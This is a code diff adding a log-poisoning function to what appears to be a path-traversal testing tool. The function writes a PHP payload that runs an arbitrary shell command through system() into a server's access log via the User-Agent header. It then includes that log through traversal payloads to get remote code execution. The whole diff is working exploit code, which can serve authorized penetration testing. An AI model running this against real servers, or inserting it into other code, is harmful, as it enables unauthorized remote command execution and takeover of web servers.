@@ -131,3 +131,36 @@ def run_wrapper(session, url_template, wrapper, resource=None, cmd=None,
                  "payload": payload, "method": m,
                  "confidence": result["confidence"], "snippet": result["snippet"]}]
     return []
+
+
+def run_log_poison(session, url_template, log_path, cmd, depth=8,
+                   os_filter="linux", delay=0.3, method=None):
+    """LFI-to-RCE via log poisoning: plant PHP in the access log through the
+    User-Agent header, then include the log through the traversal point.
+
+    Two steps: (1) a request whose User-Agent carries the PHP payload (written
+    verbatim into the web server's access log); (2) traversal to the log file,
+    which executes the planted PHP. Confirmed by an echoed canary."""
+    if FUZZ not in (url_template or ""):
+        raise ValueError("A FUZZ marker is required in the URL for log poisoning.")
+    nonce = "TRAVERSE_" + uuid.uuid4().hex[:12]
+    php = f"<?php echo '{nonce}'; system('{cmd}'); ?>"
+
+    # 1) Poison: write the PHP into the log via the User-Agent header.
+    send(session, method or "GET", inject(url_template, "traverse_poison"),
+         headers={"User-Agent": php})
+
+    # 2) Include the log through the traversal point and look for the canary.
+    for payload in generate_payloads(log_path, depth, os_filter):
+        try:
+            resp = send(session, method or "GET", inject(url_template, payload))
+        except Exception as e:
+            print(f"[!] error on {payload[:40]}: {e}")
+            continue
+        result = classify(resp.text, resp.status_code, None, 0, 200, nonce=nonce)
+        if result["hit"]:
+            return [{"target": f"log-poison:{log_path}", "category": "lfi-rce",
+                     "payload": payload, "method": method or "GET",
+                     "confidence": result["confidence"], "snippet": result["snippet"]}]
+        time.sleep(delay)
+    return []
